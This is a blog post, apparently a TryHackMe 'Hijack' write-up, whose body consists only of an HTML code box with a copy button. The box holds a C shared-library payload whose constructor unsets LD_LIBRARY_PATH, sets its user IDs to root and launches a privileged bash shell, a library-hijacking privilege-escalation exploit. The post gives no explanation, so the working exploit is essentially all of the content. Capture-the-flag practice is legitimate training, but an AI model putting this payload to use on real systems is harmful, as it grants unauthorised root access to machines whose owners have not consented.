---
# multilingual page pair id, this must pair with translations of this page. (This name must be unique)
lng_pair: tryhackme_Hijacking
title: TRYHACKME HİJACK WRİTE UP

# post specific
# if not specified, .name will be used from _data/owner.yml
author: Naci Balcı
# multiple category is not supported
category: TryHackMe
# multiple tag entries are possible
tags: [nfs, Command İnjection,BruteForce]
# thumbnail image for post
img: ":diwa.png"
# disable comments on this page
#comments_disable: true

# publish date
date: 2024-06-24 11:43:10 +0900

# seo
# if not specified, date will be used.
#meta_modify_date: 2022-03-03 12:32:10 +0900
# check the meta_common_description in _data/lang/[language].yml
#meta_description: ""

# optional
# if you enabled image_viewer_posts you don't need to enable this. This is only if image_viewer_posts = false
#image_viewer_on: true
# if you enabled image_lazy_loader_posts you don't need to enable this. This is only if image_lazy_loader_posts = false
#image_lazy_loader_on: true
# exclude from on site search
#on_site_search_exclude: true
# exclude from search engines
#search_engine_exclude: true
# to disable this page, simply set published: false or delete this file
#published: false
---

Naci Balcı Writeups
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Style Code Box</title>
    <style>
        body {
            background-color: #121212;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .code-container {
            position: relative;
            width: 80%;
            max-width: 800px;
        }
        .code-box {
            background-color: rgba(0, 0, 0, 0.8);  /* Siyah arka plan ve opaklık */
            color: #00ff00;                       /* Yeşil metin rengi */
            border: 1px solid #00ff00;            /* Yeşil kenarlık */
            padding: 20px;                        /* İç boşluk */
            margin: 10px 0;                       /* Dış boşluk */
            overflow-x: auto;                     /* Yatay kaydırma */
            font-family: monospace;               /* Monospace yazı tipi */
            white-space: pre;                     /* Önceden biçimlendirilmiş metin */
            border-radius: 5px;                   /* Köşeleri yuvarla */
        }
        .copy-button {
            position: absolute;
            top: 10px;
            right: 10px;
            background-color: #00ff00;
            color: #000;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            border-radius: 3px;
            font-weight: bold;
        }
        .copy-button:hover {
            background-color: #00cc00;
        }
    </style>
</head>
<body>

<div class="code-container">
    <button class="copy-button" onclick="copyCode()">Kopyala</button>
    <div class="code-box">
<pre><code>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}

int main() {
    printf("Hijacking...\n");
    return 0;
}
</code></pre>
    </div>
</div>

<script>
    function copyCode() {
        const codeBox = document.querySelector('.code-box code');
        const textArea = document.createElement('textarea');
        textArea.value = codeBox.innerText;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        alert('Kod kopyalandı!');
    }
</script>

</body>
</html>
